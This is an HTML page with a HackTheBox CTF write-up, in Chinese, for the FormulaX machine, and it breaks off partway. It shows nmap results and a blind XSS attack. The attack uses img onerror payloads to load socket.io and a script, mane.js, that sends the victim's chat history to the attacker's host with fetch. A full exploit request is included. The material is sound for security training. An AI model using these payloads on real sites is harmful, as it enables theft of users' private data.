@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P FormulaX0x1 nmap12345678910111213141516PORT   STATE SERVICE REASON         VERSION22">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - FormulaX">
+<meta property="og:url" content="https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P FormulaX0x1 nmap12345678910111213141516PORT   STATE SERVICE REASON         VERSION22">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240310203118-ltk1ma1.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240310210352-qt4qo29.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240310212015-1qy65ss.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240310042349-cdj76m6.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240310044400-tykg40q.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240311003306-g5hdelx.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240311003518-mj4dkhk.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240311010120-66zus0u.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240311010209-qlpvzgk.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240311011004-0936e6t.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240311011138-7lwmxgf.png">
+<meta property="article:published_time" content="2024-03-10T18:02:33.000Z">
+<meta property="article:modified_time" content="2024-08-17T15:27:38.473Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240310203118-ltk1ma1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - FormulaX</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/03/18/2024-htb-machine/11-WifineticTwo/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/04/2024-htb-machine/09-perfection/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&text=HackTheBox - Machine - FormulaX"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&title=HackTheBox - Machine - FormulaX"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&is_video=false&description=HackTheBox - Machine - FormulaX"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - FormulaX&body=Check out this article: https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&title=HackTheBox - Machine - FormulaX"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&title=HackTheBox - Machine - FormulaX"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&title=HackTheBox - Machine - FormulaX"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&title=HackTheBox - Machine - FormulaX"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&name=HackTheBox - Machine - FormulaX&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/03/11/2024-htb-machine/10-FormulaX/&t=HackTheBox - Machine - FormulaX"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - FormulaX
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-10T18:02:33.000Z" class="dt-published" itemprop="datePublished">2024-03-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="FormulaX"><a href="#FormulaX" class="headerlink" title="FormulaX"></a>FormulaX</h1><h2 id="0x1-nmap"><a href="#0x1-nmap" class="headerlink" title="0x1 nmap"></a>0x1 nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 5f:b2:<span class="built_in">cd</span>:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG8rGSIhEBCPw+TyWPlQnCQOhuDZwBuKTDmhMvwgTYIpqvWGe1d5Mtt2LA1hpEl/0cYRCmDfmsgs4xWffPDaK48=</span><br><span class="line">|   256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDxdSOINZhnpi+VKvc9X6X/yYgzl88VdajTFgliPg6Jl</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-cors: GET POST</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 496A37014B10519386B2904D1B3086BE</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">| http-title: Site doesn<span class="string">&#x27;t have a title (text/html; charset=UTF-8).</span></span><br><span class="line"><span class="string">|_Requested resource was /static/index.html</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>
+
+<p>經典困難機器只開兩個端口。</p>
+<h2 id="0x2-80-Web-XSS"><a href="#0x2-80-Web-XSS" class="headerlink" title="0x2 80 - Web - XSS"></a>0x2 80 - Web - XSS</h2><p>打開了80端口之後會隨手 dirscan一下，但是好像什麽都沒有，所以就先注冊一個賬號然後看看。</p>
+<p>進去之後有一個大大的 <code>chat now</code>​，在右上角有一些功能，其中 <code>Change Password</code>​ 和 <code>Contact Us</code>​最吸引人。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240310203118-ltk1ma1.png" alt="image">​</p>
+<p>看到沒有CSP，所以隨手測試一下有沒有XSS，結果這裏沒有XSS。命令的話可以用一些基本的命令，但是基本的命令只有 <code>history</code>​，其他的什麽也沒有。</p>
+<p>回到主頁，對 <code>Change Password</code>​ 和 <code>Contact Us</code>​ 感興趣，其他的什麽也沒有。</p>
+<p>打開 <code>Contact Us</code>​ ，有三個輸入框，隨手測試一下XSS，但是沒有回顯。</p>
+<p>所以開啓一個簡單的http server測試一下看看：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://10.10.16.21/img&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://10.10.16.21/script&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240310210352-qt4qo29.png" alt="image">​</p>
+<p>看起來script好像不工作，只能用image了，還好image有一個 <code>onerror</code>​的事件：</p>
+<blockquote>
+<p> <strong>&lt;</strong> img <strong>src</strong>&#x3D;”image.gif” <strong>onerror</strong>&#x3D;”myFunction()” <strong>&gt;</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.w3schools.com/jsref/event_onerror.asp">https://www.w3schools.com/jsref/event_onerror.asp</a></p>
+</blockquote>
+<p>由於 onerror 可以加載js，使用js插入js，嘗試看看能不能正常的解析js裏面的内容。</p>
+<blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> scriptEle = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">scriptEle.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, <span class="string">&quot;https://www.mywebsite.com/test.js&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(scriptEle);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.educative.io/answers/how-to-dynamically-load-a-js-file-in-javascript">https://www.educative.io/answers/how-to-dynamically-load-a-js-file-in-javascript</a></p>
+</blockquote>
+<p>新建一個文件：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mane.js</span></span><br><span class="line">fetch (<span class="string">&quot;http://10.10.16.21/inManeJS&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>所以payload可以改成這樣：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://10.10.16.21/1111&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;let scriptEle = document.createElement(&quot;script&quot;); scriptEle.setAttribute(&quot;src&quot;, &quot;http://10.10.16.21/mane.js&quot;); document.body.appendChild(scriptEle);&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到它可以執行js裏面的内容。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/11-FormulaX-51ju23JHNISDg/image-20240310212015-1qy65ss.png" alt="image">​</p>
+<p>用nc看看是什麽連接的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnkp 80</span><br><span class="line">listening on [any] 80 ...</span><br><span class="line">connect to [10.10.16.21] from (UNKNOWN) [10.129.91.95] 57662</span><br><span class="line">GET /1111 HTTP/1.1</span><br><span class="line">Host: 10.10.16.21</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/113.0.5672.63 Safari/537.36</span><br><span class="line">Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8</span><br><span class="line">Referer: http://chatbot.htb/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
+
+<p>是個瀏覽器在背後運行，嘗試dump cookie，什麽也沒有。既然可以運行自定義的js，那麽就可以模擬用戶輸入history，得到用戶的聊天記錄。由於聊天都是通過 ws 的，所以要看一下ws的工作原理是什麽。</p>
+<p>先看一下他是怎麽發送信息的，來到 <code>http://10.129.91.95/restricted/chat.html</code>​ 查看源碼，看到：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/socket.io/socket.io.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./chat.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中  <code>chat.js</code>​  有發送按鈕的事件：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> value;</span><br><span class="line"><span class="keyword">const</span> res = axios.<span class="title function_">get</span>(<span class="string">`/user/api/chat`</span>);</span><br><span class="line"><span class="keyword">const</span> socket = <span class="title function_">io</span>(<span class="string">&#x27;/&#x27;</span>,&#123;<span class="attr">withCredentials</span>: <span class="literal">true</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//listening for the messages</span></span><br><span class="line">socket.<span class="title function_">on</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">my_message</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//console.log(&quot;Received From Server: &quot; + my_message)</span></span><br><span class="line">  <span class="title class_">Show</span>_messages_on_screen_of_Server(my_message)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">typing_chat</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  value = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;user_message&#x27;</span>).<span class="property">value</span></span><br><span class="line">  <span class="keyword">if</span> (value) &#123;</span><br><span class="line">    <span class="comment">// sending the  messages to the server</span></span><br><span class="line">    socket.<span class="title function_">emit</span>(<span class="string">&#x27;client_message&#x27;</span>, value)</span><br><span class="line">    <span class="title class_">Show</span>_messages_on_screen_of_Client(value);</span><br><span class="line">    <span class="comment">// here we will do out socket things..</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;user_message&#x27;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;Cannot send Empty Messages&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<p>因爲要發送 <code>history</code>​ ，可以自定義下面的函數，然後包在payload，并且發送 ：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mane.js</span></span><br><span class="line"><span class="keyword">let</span> value;</span><br><span class="line"><span class="keyword">const</span> res = axios.<span class="title function_">get</span>(<span class="string">`/user/api/chat`</span>);</span><br><span class="line"><span class="keyword">const</span> socket = <span class="title function_">io</span>(<span class="string">&#x27;/&#x27;</span>,&#123;<span class="attr">withCredentials</span>: <span class="literal">true</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//listening for the messages</span></span><br><span class="line">socket.<span class="title function_">on</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">my_message</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//console.log(&quot;Received From Server: &quot; + my_message)</span></span><br><span class="line">  <span class="comment">// Show_messages_on_screen_of_Server(my_message)</span></span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&quot;http://10.10.16.21/?=&quot;</span> + (my_message));</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">manepwn</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  value = <span class="string">&quot;history&quot;</span></span><br><span class="line">  <span class="keyword">if</span> (value) &#123;</span><br><span class="line">    <span class="comment">// sending the  messages to the server</span></span><br><span class="line">    socket.<span class="title function_">emit</span>(<span class="string">&#x27;client_message&#x27;</span>, value)</span><br><span class="line">    <span class="title class_">Show</span>_messages_on_screen_of_Client(value);</span><br><span class="line">    <span class="comment">// here we will do out socket things..</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;user_message&#x27;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;Cannot send Empty Messages&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">manepwn</span>()</span><br></pre></td></tr></table></figure>
+
+<p>因爲要調用 socket.io ，還需要導入 <code>/socket.io/socket.io.js</code>​ 才可以使用。</p>
+<p>在發送的包中有三個field，在 <code>first_name</code>​，<code>last_name</code>​，<code>message</code>​ 選一個，由於要先加載 socket.io 才可以使用 <code>socket.on</code>​，需要在瀏覽器一開始的地方就要加載</p>
+<p>所以完整的payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /user/api/contact_us HTTP/1.1</span><br><span class="line">Host: 10.129.91.95</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 466</span><br><span class="line">Origin: http://10.129.91.95</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.129.91.95/restricted/contact_us.html</span><br><span class="line">Cookie: authorization=Bearer%20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NWVkY2YyNzBlYjdlZWQxNmNkNjk5MGMiLCJpYXQiOjE3MTAwODM4ODR9.aPMiGaoBtMfe7oECH3UUzZnMJ150b9-onXPsTlo8paY</span><br><span class="line"></span><br><span class="line">&#123;&quot;first_name&quot;:&quot;&lt;img src=&#x27;http://10.10.16.21/loading_socket&#x27; onerror=&#x27;let scriptEle = document.createElement(\&quot;script\&quot;); scriptEle.setAttribute(\&quot;src\&quot;, \&quot;/socket.io/socket.io.js\&quot;); document.body.appendChild(scriptEle);&#x27;&gt;&quot;,&quot;last_name&quot;:&quot;aaa&quot;,&quot;message&quot;:&quot;&lt;img src=&#x27;http://10.10.16.21/loading_payload&#x27; onerror=&#x27;let scriptEle = document.createElement(\&quot;script\&quot;); scriptEle.setAttribute(\&quot;src\&quot;, \&quot;http://10.10.16.21/mane.js\&quot;); 